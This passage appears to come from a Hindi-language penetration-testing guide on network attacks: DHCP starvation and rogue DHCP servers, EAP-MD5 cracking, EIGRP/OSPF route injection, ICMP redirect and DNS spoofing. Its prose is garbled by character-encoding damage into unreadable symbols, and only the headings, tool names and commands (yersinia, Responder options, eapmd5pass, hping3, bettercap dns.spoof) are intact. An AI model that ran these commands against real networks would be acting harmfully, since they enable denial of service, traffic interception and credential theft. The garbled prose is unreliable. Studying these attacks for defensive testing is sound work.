DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдЦрд┐рд▓рд╛рдл **рджреЛ рдкреНрд░рдХрд╛рд░ рдХреА DoS** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред рдкрд╣рд▓реА рдореЗрдВ **рдХрд╛рдлреА рдирдХрд▓реА рд╣реЛрд╕реНрдЯ рдХреЛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЕрдиреБрдХрд░рдг** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдпрд╣ рд╣рдорд▓рд╛ рдХреЗрд╡рд▓ рддрднреА рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдЕрдЧрд░ рдЖрдк DHCP рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдкреВрд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (**рдбрд┐рд╕реНрдХрд╡рд░** (рдХрдВрдкреНрдпреВрдЯрд░) --> **рдСрдлрд░** (рд╕рд░реНрд╡рд░) --> **рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ** (рдХрдВрдкреНрдпреВрдЯрд░) --> **рдПрдХреЗрдХреЗ** (рд╕рд░реНрд╡рд░))ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрд╣ **рд╡рд╛рдИ-рдлрд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ**ред

DHCP DoS рдХреЛ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдПрдХ **DHCP-рд░рд┐рд▓реАрдЬрд╝ рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд░ рд╕рдВрднрд╛рд╡рд┐рдд IP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛** рд╣реИред рдлрд┐рд░, рд╕рд░реНрд╡рд░ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ рд╕рднреА рдиреЗ IP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рдорд╛рдкреНрдд рдХрд░ рджрд┐рдпрд╛ рд╣реИред
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рддрд░реАрдХрд╛ рд╣реИ рдЙрдкрдХрд░рдг [DHCPing](https://github.com/kamorin/DHCPig) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред

рдЖрдк рдорд╛рдиреНрдп рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд▓реНрд▓рд┐рдЦрд┐рдд DoS рд╣рдорд▓реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреНрд▓рд╛рдЗрдВрдЯреНрд╕ рдХреЛ рдирдП рд▓реАрдЬрд╝ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдЕрд╕рдХреНрд░рд┐рдп рдХрд░ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рддрд╛рдХрд┐ рд╡реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рди рд╣реЛрдВред рдЗрд╕рд▓рд┐рдП рдЬрдм рдорд╛рдиреНрдп рд╕рд░реНрд╡рд░ рдлрд┐рд░ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, **рдЖрдк рдЕрдЧрд▓реЗ рд╣рдорд▓реЗ рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рджреБрд╖реНрдХрд░реНрдореА рдорд╛рдиреНрдпрддрд╛рдПрдБ рд╕рд░реНрд╡ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

#### рджреБрд╖реНрдХрд░реНрдореА рдорд╛рдиреНрдпрддрд╛рдПрдБ рд╕реЗрдЯ рдХрд░реЗрдВ

рдЖрдк рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг DHCP рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Responder DHCP рд╕реНрдХреНрд░рд┐рдкреНрдЯ (_/usr/share/responder/DHCP.py_) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рджреБрд╖реНрдХрд░реНрдореА рдЧреЗрдЯрд╡реЗ рд╕реЗрдЯ рдХрд░рдирд╛ рдЖрджрд░реНрд╢ рдирд╣реАрдВ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╣рд╛рдЗрдЬреИрдХ рдХреА рдЧрдИ рдХрдиреЗрдХреНрд╢рди рдХреЗрд╡рд▓ рдЖрдзрд╛-рдбреБрдкреНрд▓реЗрдХреНрд╕ рд╣реЛрддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рдд рд╣рдо рдХреНрд▓рд╛рдЗрдВрдЯ рд╕реЗ рдирд┐рдХрд▓рдиреЗ рд╡рд╛рд▓реЗ рдкреИрдХреЗрдЯ рдХреИрдкреНрдЪрд░ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдорд╛рдиреНрдп рдЧреЗрдЯрд╡реЗ рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд╣реАрдВ рдорд┐рд▓рддреА рд╣реИрдВ)ред рдЗрд╕рд▓рд┐рдП, рдореИрдВ рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг DNS рдпрд╛ WPAD рд╕рд░реНрд╡рд░ рд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХрд░реВрдБрдЧрд╛ рддрд╛рдХрд┐ HTTP рдЯреНрд░реИрдлрд┐рдХ рдФрд░ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

| рд╡рд┐рд╡рд░рдг                                       | рдЙрджрд╛рд╣рд░рдг                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| рд╣рдорд╛рд░рд╛ IP рдкрддрд╛, рдЧреЗрдЯрд╡реЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ | _-i 10.0.0.100_                                                              |
| рд╕реНрдерд╛рдиреАрдп DNS рдбреЛрдореЗрди рдирд╛рдо (рд╡реИрдХрд▓реНрдкрд┐рдХ)        | _-d example.org_                                                             |
| рдореВрд▓ рд░рд╛рдЙрдЯрд░/рдЧреЗрдЯрд╡реЗ рдХрд╛ IP рдкрддрд╛   | _-r 10.0.0.1_                                                                |
| рдкреНрд░рд╛рдердорд┐рдХ DNS рд╕рд░реНрд╡рд░ IP рдкрддрд╛               | _-p 10.0.0.100_                                                              |
| рджреНрд╡рд┐рддреАрдпрдХ DNS рд╕рд░реНрд╡рд░ IP рдкрддрд╛ (рд╡реИрдХрд▓реНрдкрд┐рдХ)  | _-s 10.0.0.1_                                                                |
| рд╕реНрдерд╛рдиреАрдп рдиреЗрдЯрд╡рд░реНрдХ рдХрд╛ рдиреЗрдЯрдорд╛рд╕реНрдХ            | _-n 255.255.255.0_                                                           |
| DHCP рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рд╕реБрдирдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рдлреЗрд╕ | _-I eth1_                                                                    |
| WPAD рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрддрд╛ (URL)            | _-w тАЬ_[http://10.0.0.100/wpad.dat\nтАЭ](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЧреЗрдЯрд╡реЗ IP рдкрддрд╛ рдХрд╛ рдзреЛрдЦрд╛ рджреЗрдирд╛        | -S                                                                           |
| рд╕рднреА DHCP рдЕрдиреБрд░реЛрдзреЛрдВ рдХрд╛ рдЬрд╡рд╛рдм рджреЗрдирд╛ (рдмрд╣реБрдд рд╢реЛрд░)   | -R                                                                           |

### **EAP рд╣рдорд▓реЗ**

рдпрд╣рд╛рдБ рдХреБрдЫ рд╣рдорд▓реЗ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ рдЬреЛ 802.1X рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрдиреЛрдВ рдХреЗ рдЦрд┐рд▓рд╛рдл рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

* EAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдкрд╛рд╕рд╡рд░реНрдб рдЧреНрд░рд╛рдЗрдВрдбрд┐рдВрдЧ
* рд░реЗрдбрд┐рдпрд╕ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрд╡рд┐рдХрд▓ рдИрдПрдкреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рд╣рдорд▓рд╛ _\*\*_(рд╢реЛрд╖рдг)
* EAP рд╕рдВрджреЗрд╢ рдХреИрдкреНрдЪрд░ рдФрд░ рдСрдлрд▓рд╛рдЗрди рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ (EAP-MD5 рдФрд░ PEAP)
* EAP-MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдЯреАрдПрд▓рдПрд╕ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдорд╛рдиреНрдпрддрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдирд╛
* рд╣рдм рдпрд╛ рд╕рдорд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдкрд░ рджреБрд╖реНрдХрд░реНрдореА рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдбрд╛рд▓рдирд╛

рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рд╣реИ, рддреЛ рд╡рд╣ рдкреАрдбрд╝рд┐рдд рдХреЛ EAP-MD5 рдореЗрдВ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рдХрдо рдХрд░рдиреЗ (рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ) рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдлрд┐рд░, рдЙрд╕реЗ рдЗрд╕рдХрд╛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```
eapmd5pass тАУr pcap.dump тАУw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) рд╣рдорд▓реЗ <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) рдПрдХ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХрдХреНрд╖рд╛ рд╣реИ рдЬреЛ **рдПрдХ рд╣реЙрдЯ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдорд╛рд░реНрдЧ рдкреНрд░рдгрд╛рд▓реА рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдП рдЧрдП рд╣реИрдВред FHRP рдХреЗ рд╕рд╛рде, рднреМрддрд┐рдХ рд░рд╛рдЙрдЯрд░ рдХреЛ рдПрдХ рд╣реА рддрд╛рд░реНрдХрд┐рдХ рдЙрдкрдХрд░рдг рдореЗрдВ рдорд┐рд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рджреЛрд╖ рд╕рд╣рдирд╢реАрд▓рддрд╛ рдмрдврд╝рд╛рддрд╛ рд╣реИ рдФрд░ рднрд╛рд░ рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред

**рд╕рд┐рд╕реНрдХреЛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░реНрд╕ рдиреЗ рджреЛ FHRP рдкреНрд░реЛрдЯреЛрдХреЙрд▓, GLBP рдФрд░ HSRP, рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдП рд╣реИрдВред**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

рд░реВрдЯрд┐рдВрдЧ рдЗрдирдлрд╛рд░реНрдореЗрд╢рди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (RIP) рдХреЗ рддреАрди рд╕рдВрд╕реНрдХрд░рдг рдореМрдЬреВрдж рд╣реИрдВ - RIP, RIPv2, рдФрд░ RIPngред RIP рдФрд░ RIPv2 UDP рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдкреЛрд░реНрдЯ 520 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреАрдпрд░реНрд╕ рдХреЛ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ RIPng UDP рдкреЛрд░реНрдЯ 521 рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ IPv6 рдорд▓реНрдЯреАрдХрд╛рд╕реНрдЯ рдХреЛ рдбреЗрдЯрд╛рдЧреНрд░рд╛рдо рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред RIPv2 рдиреЗ MD5 рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рдорд░реНрдерди рдкреЗрд╢ рдХрд┐рдпрд╛ред RIPng рдореЗрдВ рдореВрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИ; рдмрд▓реНрдХрд┐ рдпрд╣ IPv6 рдХреЗ рднреАрддрд░ рд╡реИрдХрд▓реНрдкрд┐рдХ IPsec AH рдФрд░ ESP рд╣реЗрдбрд░ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдХрд┐рддрд╛рдм _**рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди: рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдиреЗрдВ (3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг)**_ рдореЗрдВ рдЬрд╛рдПрдВред

### EIGRP рд╣рдорд▓реЗ

**EIGRP (Enhanced Interior Gateway Routing Protocol)** рдПрдХ рдЧрддрд┐рд╢реАрд▓ рд░реВрдЯрд┐рдВрдЧ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред **рдпрд╣ рдПрдХ рджреВрд░реА-рд╡реЗрдХреНрдЯрд░ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИред** рдпрджрд┐ **рдХреЛрдИ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдирд╣реАрдВ** рд╣реИ рдФрд░ рдкреИрд╕рд┐рд╡ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд╡рд┐рдиреНрдпрд╛рд╕, рддреЛ рдПрдХ **рдЕрддрд┐рдХреНрд░рдордгрдХрд╛рд░реА** EIGRP рд░реВрдЯрд┐рдВрдЧ рдореЗрдВ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд░реВрдЯрд┐рдВрдЧ рддрд╛рд▓рд┐рдХрд╛рдПрдБ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, EIGRP рдиреЗрдЯрд╡рд░реНрдХ (рдЕрдиреНрдп рд╢рдмреНрджреЛрдВ рдореЗрдВ, рд╕реНрд╡рддрдВрддреНрд░ рдкреНрд░рдгрд╛рд▓реА) **рд╕рдорддрд▓ рд╣реИ рдФрд░ рдХрд┐рд╕реА рднреА рдХреНрд╖реЗрддреНрд░ рдореЗрдВ рд╡рд┐рднрд╛рдЬрди рдирд╣реАрдВ рд╣реИ**ред рдпрджрд┐ рдХреЛрдИ **рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рд░реВрдЯ рдбрд╛рд▓рддрд╛ рд╣реИ**, рддреЛ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрд╣ рд░реВрдЯ рдЖрддреНрдордирд┐рд░реНрднрд░ EIGRP рдкреНрд░рдгрд╛рд▓реА рдореЗрдВ **рдлреИрд▓ рдЬрд╛рдПрдЧрд╛**ред

EIGRP рдкреНрд░рдгрд╛рд▓реА рдкрд░ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдПрдХ рд╡реИрдз EIGRP рд░рд╛рдЙрдЯрд░ рдХреЗ рд╕рд╛рде рдПрдХ рдкрдбрд╝реЛрд╕реА рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛** рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ рдореВрд▓ рдЬрд╛рд╕реВрд╕реА рд╕реЗ рд▓реЗрдХрд░ рд╡рд┐рднрд┐рдиреНрди рдЗрдВрдЬреЗрдХреНрд╢рдиреНрд╕ рддрдХ рдХрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдЦреЛрд▓рддрд╛ рд╣реИред

\*\*\*\*[**FRRouting**](https://frrouting.org/) рдЖрдкрдХреЛ **BGP, OSPF, EIGRP, RIP рдФрд░ рдЕрдиреНрдп рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╕рдорд░реНрдерд┐рдд рдПрдХ рд╡рд░реНрдЪреБрдЕрд▓ рд░рд╛рдЙрдЯрд░** рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЖрдкрдХреЛ рдмрд╕ рдЗрд╕реЗ рдЕрдкрдиреЗ рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рдбрд┐рдкреНрд▓реЙрдп рдХрд░рдирд╛ рд╣реИ рдФрд░ рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд░реВрдЯрд┐рдВрдЧ рдбреЛрдореЗрди рдореЗрдВ рдПрдХ рд╡реИрдз рд░рд╛рдЙрдЯрд░ рдмрдирдиреЗ рдХрд╛ рджрд┐рдЦрд╛рд╡рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/) рднреА EIGRP рдкреНрд░рд╕рд╛рд░ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдФрд░ рд░реВрдЯрд┐рдВрдЧ рд╡рд┐рдиреНрдпрд╛рд╕ рдХреЛ рдорд╛рдирд┐рдкреБрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрдХреЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред рдЗрд╕реЗ Coly рдХреЗ рд╕рд╛рде рдХреИрд╕реЗ рд╣рдорд▓рд╛ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП _**рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди: рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдиреЗрдВ (3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг)**_ рджреЗрдЦреЗрдВред

### OSPF

рдЕрдзрд┐рдХрд╛рдВрд╢ рдУрдкрди рд╢реЙрд░реНрдЯреЗрд╕реНрдЯ рдкрде рдлрд░реНрд╕реНрдЯ (OSPF) рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди MD5 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд░рд╛рдЙрдЯрд░реНрд╕ рдХреЗ рдмреАрдЪ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рджрд╛рди рдХрд░реЗрдВред Loki рдФрд░ John the Ripper MD5 рд╣реИрд╢ рдХреЛ рдХреИрдкреНрдЪрд░ рдФрд░ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдХреБрдВрдЬреА рдкреНрд░рдХрдЯ рд╣реЛ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рдирдП рд░реВрдЯреНрд╕ рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд░реВрдЯ рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ _Injection_ рдЯреИрдм рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ рдХреБрдВрдЬреА _Connection_ рдХреЗ рддрд╣рдд рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИред

рдЗрд╕ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдХрд┐рддрд╛рдм _**рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди: рдЕрдкрдиреЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдиреЗрдВ (3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг)**_ рдореЗрдВ рдЬрд╛рдПрдВред

### рдЕрдиреНрдп рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдХрд░рдг рдФрд░ рд╕реНрд░реЛрдд

* [**Above**](https://github.com/c4s73r/Above): рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рд╕реНрдХреИрди рдХрд░рдиреЗ рдФрд░ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг
* рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://github.com/Sab0tag3d/MITM-cheatsheet) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред _(TODO: рд╕рднреА рдФрд░ рдирдП рд╣рдорд▓реЗ рдпрджрд┐ рдХреЛрдИ рд╣реИрдВ, рддреЛ рд╕рднреА рдкрдврд╝реЗрдВ)_

## **рд╕реНрдкреВрдлрд┐рдВрдЧ**

рд╣рдорд▓рд╛рд╡рд░ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдирдП рд╕рджрд╕реНрдп рдХреЗ рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдкреИрд░рд╛рдореАрдЯрд░ (рдЬреАрдбрдмреНрд▓реНрдпреВ, рдЖрдИрдкреА, рдбреАрдПрдирдПрд╕) рдХреЛ рдирдХрд▓реА DHCP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рднреЗрдЬрдХрд░ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддрд╛ рд╣реИред
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ(./#arp-spoofing).

### ICMPRedirect

ICMP Redirect рдореЗрдВ рдПрдХ ICMP рдкреИрдХреЗрдЯ рдкреНрд░рдХрд╛рд░ 1 рдХреЛрдб 5 рднреЗрдЬрдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐ рд╣рдорд▓рд╛рд╡рд╛рджреА рдХрд┐рд╕реА рдЖрдИрдкреА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред рдлрд┐рд░, рдЬрдм рдкреАрдбрд╝рд┐рдд рдЖрдИрдкреА рд╕реЗ рд╕рдВрдкрд░реНрдХ рдХрд░рдирд╛ рдЪрд╛рд╣рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛рд╡рд╛рджреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬреЗрдЧрд╛ред
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS рд╕реНрдкреВрдлрд┐рдВрдЧ

рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рд╡рд╣ рдХреБрдЫ (рдпрд╛ рд╕рднреА) рдбреЛрдореЗрди рдЬрд┐рдирдХрд╛ рд╡рд╣ рдкреВрдЫрддрд╛ рд╣реИ, рдЙрдирдХрд╛ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдХрд░реЗрдЧрд╛ред
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
